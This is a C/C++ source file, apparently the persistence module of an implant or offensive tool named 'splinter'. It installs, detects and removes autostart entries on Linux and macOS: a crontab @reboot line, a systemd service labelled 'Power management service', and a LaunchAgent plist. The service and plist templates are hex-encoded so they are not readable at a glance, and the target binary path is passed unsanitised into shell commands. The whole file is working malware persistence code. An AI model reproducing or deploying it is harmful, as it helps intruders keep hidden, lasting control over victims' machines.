#include <errno.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#ifdef __linux__
#include <experimental/filesystem>
#elif __APPLE__
#include <unistd.h>
#endif

#include "persistence.h"

unsigned char splinter_begin_service[] = {
  0x5b, 0x55, 0x6e, 0x69, 0x74, 0x5d, 0x0a, 0x44, 0x65, 0x73, 0x63, 0x72,
  0x69, 0x70, 0x74, 0x69, 0x6f, 0x6e, 0x3d, 0x50, 0x6f, 0x77, 0x65, 0x72,
  0x20, 0x6d, 0x61, 0x6e, 0x61, 0x67, 0x65, 0x6d, 0x65, 0x6e, 0x74, 0x20,
  0x73, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65, 0x0a, 0x41, 0x66, 0x74, 0x65,
  0x72, 0x3d, 0x6e, 0x65, 0x74, 0x77, 0x6f, 0x72, 0x6b, 0x2e, 0x74, 0x61,
  0x72, 0x67, 0x65, 0x74, 0x0a, 0x0a, 0x5b, 0x53, 0x65, 0x72, 0x76, 0x69,
  0x63, 0x65, 0x5d, 0x0a, 0x54, 0x79, 0x70, 0x65, 0x3d, 0x73, 0x69, 0x6d,
  0x70, 0x6c, 0x65, 0x0a, 0x45, 0x78, 0x65, 0x63, 0x53, 0x74, 0x61, 0x72,
  0x74, 0x3d
};

unsigned char splinter_end_service[] = {
  0x0a, 0x5b, 0x49, 0x6e, 0x73, 0x74, 0x61, 0x6c, 0x6c, 0x5d, 0x0a, 0x57,
  0x61, 0x6e, 0x74, 0x65, 0x64, 0x42, 0x79, 0x3d, 0x6d, 0x75, 0x6c, 0x74,
  0x69, 0x2d, 0x75, 0x73, 0x65, 0x72, 0x2e, 0x74, 0x61, 0x72, 0x67, 0x65,
  0x74, 0x0a, 0x0a
};

unsigned char splinter_plist1[] = {
  0x3c, 0x3f, 0x78, 0x6d, 0x6c, 0x20, 0x76, 0x65, 0x72, 0x73, 0x69, 0x6f,
  0x6e, 0x3d, 0x22, 0x31, 0x2e, 0x30, 0x22, 0x20, 0x65, 0x6e, 0x63, 0x6f,
  0x64, 0x69, 0x6e, 0x67, 0x3d, 0x22, 0x55, 0x54, 0x46, 0x2d, 0x38, 0x22,
  0x3f, 0x3e, 0x0a, 0x3c, 0x21, 0x44, 0x4f, 0x43, 0x54, 0x59, 0x50, 0x45,
  0x20, 0x70, 0x6c, 0x69, 0x73, 0x74, 0x20, 0x50, 0x55, 0x42, 0x4c, 0x49,
  0x43, 0x20, 0x22, 0x2d, 0x2f, 0x2f, 0x41, 0x70, 0x70, 0x6c, 0x65, 0x20,
  0x43, 0x6f, 0x6d, 0x70, 0x75, 0x74, 0x65, 0x72, 0x2f, 0x2f, 0x44, 0x54,
  0x44, 0x20, 0x50, 0x4c, 0x49, 0x53, 0x54, 0x20, 0x31, 0x2e, 0x30, 0x2f,
  0x2f, 0x45, 0x4e, 0x22, 0x20, 0x22, 0x68, 0x74, 0x74, 0x70, 0x3a, 0x2f,
  0x2f, 0x77, 0x77, 0x77, 0x2e, 0x61, 0x70, 0x70, 0x6c, 0x65, 0x2e, 0x63,
  0x6f, 0x6d, 0x2f, 0x44, 0x54, 0x44, 0x73, 0x2f, 0x50, 0x72, 0x6f, 0x70,
  0x65, 0x72, 0x74, 0x79, 0x4c, 0x69, 0x73, 0x74, 0x2d, 0x31, 0x2e, 0x30,
  0x2e, 0x64, 0x74, 0x64, 0x22, 0x3e, 0x0a, 0x3c, 0x70, 0x6c, 0x69, 0x73,
  0x74, 0x20, 0x76, 0x65, 0x72, 0x73, 0x69, 0x6f, 0x6e, 0x3d, 0x22, 0x31,
  0x2e, 0x30, 0x22, 0x3e, 0x0a, 0x3c, 0x64, 0x69, 0x63, 0x74, 0x3e, 0x0a,
  0x09, 0x3c, 0x6b, 0x65, 0x79, 0x3e, 0x4c, 0x61, 0x62, 0x65, 0x6c, 0x3c,
  0x2f, 0x6b, 0x65, 0x79, 0x3e, 0x0a, 0x09, 0x3c, 0x73, 0x74, 0x72, 0x69,
  0x6e, 0x67, 0x3e, 0x63, 0x6f, 0x6d, 0x2e, 0x7a, 0x65, 0x72, 0x6f, 0x77,
  0x69, 0x64, 0x74, 0x68, 0x2e, 0x6c, 0x61, 0x75, 0x6e, 0x63, 0x68, 0x65,
  0x64, 0x2e, 0x73, 0x70, 0x6c, 0x69, 0x6e, 0x74, 0x65, 0x72, 0x3c, 0x2f,
  0x73, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x3e, 0x0a, 0x09, 0x3c, 0x6b, 0x65,
  0x79, 0x3e, 0x4c, 0x61, 0x75, 0x6e, 0x63, 0x68, 0x4f, 0x6e, 0x6c, 0x79,
  0x4f, 0x6e, 0x63, 0x65, 0x3c, 0x2f, 0x6b, 0x65, 0x79, 0x3e, 0x0a, 0x09,
  0x3c, 0x74, 0x72, 0x75, 0x65, 0x2f, 0x3e, 0x0a, 0x09, 0x3c, 0x6b, 0x65,
  0x79, 0x3e, 0x50, 0x72, 0x6f, 0x67, 0x72, 0x61, 0x6d, 0x41, 0x72, 0x67,
  0x75, 0x6d, 0x65, 0x6e, 0x74, 0x73, 0x3c, 0x2f, 0x6b, 0x65, 0x79, 0x3e,
  0x0a, 0x09, 0x3c, 0x61, 0x72, 0x72, 0x61, 0x79, 0x3e, 0x0a, 0x09, 0x09,
  0x3c, 0x73, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x3e, 0x73, 0x68, 0x3c, 0x2f,
  0x73, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x3e, 0x0a, 0x09, 0x09, 0x3c, 0x73,
  0x74, 0x72, 0x69, 0x6e, 0x67, 0x3e, 0x2d, 0x63, 0x3c, 0x2f, 0x73, 0x74,
  0x72, 0x69, 0x6e, 0x67, 0x3e, 0x0a, 0x09, 0x09, 0x3c, 0x73, 0x74, 0x72,
  0x69, 0x6e, 0x67, 0x3e, 0x0a
};

unsigned char splinter_plist2[] = {
  0x09, 0x09, 0x3c, 0x2f, 0x73, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x3e, 0x0a,
  0x09, 0x3c, 0x2f, 0x61, 0x72, 0x72, 0x61, 0x79, 0x3e, 0x0a, 0x09, 0x3c,
  0x6b, 0x65, 0x79, 0x3e, 0x52, 0x75, 0x6e, 0x41, 0x74, 0x4c, 0x6f, 0x61,
  0x64, 0x3c, 0x2f, 0x6b, 0x65, 0x79, 0x3e, 0x0a, 0x09, 0x3c, 0x74, 0x72,
  0x75, 0x65, 0x2f, 0x3e, 0x0a, 0x3c, 0x2f, 0x64, 0x69, 0x63, 0x74, 0x3e,
  0x0a, 0x3c, 0x2f, 0x70, 0x6c, 0x69, 0x73, 0x74, 0x3e, 0x0a
};

unsigned int splinter_plist2_len = 70;
unsigned int splinter_plist1_len = 377;
unsigned int splinter_end_service_len = 39;
unsigned int splinter_begin_service_len = 98;


size_t executeCommand(const char* command, char* output, size_t size)
{
    char buffer[255];
    memset(buffer, 0, 255);
    if (output != NULL)
    {
	memset(output, 0, size);
    }
    strncat(buffer, command, strlen(command));
    strncat(buffer, " 2>&1", 6);

    FILE* fp = popen(buffer, "r");

    if (fp == NULL)
    {
        return 0;
    }

    size_t bytes = 0;
    
    if (output != NULL)
    {
	bytes = fread((char*)output, 1, size, fp);
    }
    pclose(fp);
    return bytes;
}

OSType detectOS()
{
#ifdef __linux__
    char command[] = "cat /etc/os-release | grep \"^ID=\" | awk -F '=' '{print $2}' | sed 's/\"//g'";
    char output[50];

    if (executeCommand(command, output, 50) != 0)
    {
	if (strncmp("centos", output, 6) == 0)
	{
	    return centos;
	}
	else if (strncmp("ubuntu", output, 6) == 0)
	{
	    return ubuntu;
	}
	else if (strncmp("arch", output, 4) == 0)
    {
        return arch;
    }
	else
	{
	    return none;
	}
    }
#elif  __APPLE__
    return macos;
#endif
    return none;
}

unsigned int isPersistent(char* bin)
{
    // if entry is in crontab, it is user persistence
    unsigned int persist = 0;
    char command[255];
    memset(command, 0, 255);

    strncat(command, "crontab -l | grep \"", 20);
    strncat(command, bin, strlen(bin));
    strncat(command, "\"", 2);

    char *output = (char*)malloc(8192);
    if (executeCommand(command, output, 8192) != 0)
    {
	printf("OUTPUT: %s\n", output);
	persist += 1;
    }

    // if entry is in systemd, it is system persistence

    OSType ostype = detectOS();
    bool isServiceFound = false;

    switch (ostype)
    {
#ifdef __linux__
    case centos:
	isServiceFound = std::experimental::filesystem::exists("/usr/lib/systemd/system/splinter.service");
	break;
    case ubuntu:
	isServiceFound = std::experimental::filesystem::exists("/usr/lib/systemd/system/splinter.service");
	break;
    case arch:
    isServiceFound = std::experimental::filesystem::exists("/lib/systemd/system/splinter.service");
	break;
#elif __APPLE__
    case macos:
	isServiceFound = (access("/Library/LaunchAgents/launched.splinter.plist", R_OK) == 0);
	break;
#endif
    default:
	break;
    }

    if (isServiceFound)
    {
	memset(command, 0, 255);

	strncat(command, "systemctl status ", 18);
	strncat(command, "splinter", 9);
        strncat(command, " 2>/dev/null | grep \"Active\" | awk '{print $3}' | sed 's/(//g' | sed 's/)//g'", 78);

        if (executeCommand(command, output, 8192) != 0)
        {
	    printf("OUTPUT: %s\n", output);
	    persist += 2;
        }
    }
    free(output);
    return persist;
}
unsigned int installPersistence(char* bin, PersistenceType type)
{
    OSType ostype = detectOS();

    if (type == User && (ostype == centos || ostype == ubuntu || ostype == arch || ostype == macos))
    {
        char command[1000];
        memset(command, 0, 1000);
        strncat(command, "(crontab -l; echo \"@reboot    ", 32);
        strncat(command, bin, strlen(bin));
        strncat(command, "\") | crontab -", 15);

        executeCommand(command, NULL, 0);
    }
    else if (type == System && (ostype == centos || ostype == ubuntu || ostype == arch))
    {
        FILE* fp = NULL;

        switch (ostype)
        {
        case centos: fp = fopen("/usr/lib/systemd/system/splinter.service", "wb");
            break;
        case ubuntu: fp = fopen("/usr/lib/systemd/system/splinter.service", "wb");
            break;
        case arch: fp = fopen("/lib/systemd/system/splinter.service", "wb");
            break;
        case macos: break;
        default: break;
        }

        if (fp != NULL)
        {
            fwrite(splinter_begin_service, 1, splinter_begin_service_len, fp);
            fwrite(bin, 1, strlen(bin), fp);
            fwrite(splinter_end_service, 1, splinter_end_service_len, fp);
            fclose(fp);

            executeCommand("systemctl enable splinter", NULL, 0);

            return 0;
        }
        else
        {
            printf("Error: %s\n", strerror(errno));
        }

        printf("Persistence done\n");
    }
    else if (type == System && ostype == macos)
    {
	FILE* fp = NULL;
	fp = fopen("/Library/LaunchAgents/launched.splinter.plist", "wb");

	if (fp != NULL)
	{
	    fwrite(splinter_plist1, 1, splinter_plist1_len, fp);
	    fwrite(bin, 1, strlen(bin), fp);
	    fwrite(splinter_plist2, 1, splinter_plist2_len, fp);
	    fclose(fp);

	    executeCommand("launchctl load -w /Library/LaunchAgents/launched.splinter.plist", NULL, 0);
	    return 0;
	}
    }

    return 0;
}
unsigned int removePersistence(char* bin, PersistenceType type)
{
    OSType ostype = detectOS();

    if (type == User && (ostype == centos || ostype == ubuntu || ostype == arch || ostype == macos))
    {
        char command[1000];
        memset(command, 0, 1000);
        strncat(command, "crontab -l | grep -v \"@reboot    ", 35);
        strncat(command, bin, strlen(bin));
        strncat(command, "\" | crontab -", 14);

        executeCommand(command, NULL, 0);
    }
    else if (type == System && (ostype != none))
    {
        switch (ostype)
        {
        case centos:
	    executeCommand("systemctl disable splinter", NULL, 0);
	    executeCommand("rm /usr/lib/systemd/system/splinter.service", NULL, 0);
            break;
        case ubuntu:
        executeCommand("systemctl disable splinter", NULL, 0);
        executeCommand("rm /usr/lib/systemd/system/splinter.service", NULL, 0);
            break;
        case arch:
	    executeCommand("systemctl disable splinter", NULL, 0);
	    executeCommand("rm /lib/systemd/system/splinter.service", NULL, 0);
            break;
        case macos:
	    executeCommand("launchctl unload /Library/LaunchAgents/launched.splinter.plist", NULL, 0);
	    executeCommand("rm /Library/LaunchAgents/launched.splinter.plist", NULL, 0);
	    break;
        default: break;
        }

        printf("Persistence removed\n");
    }
    return 0;
}
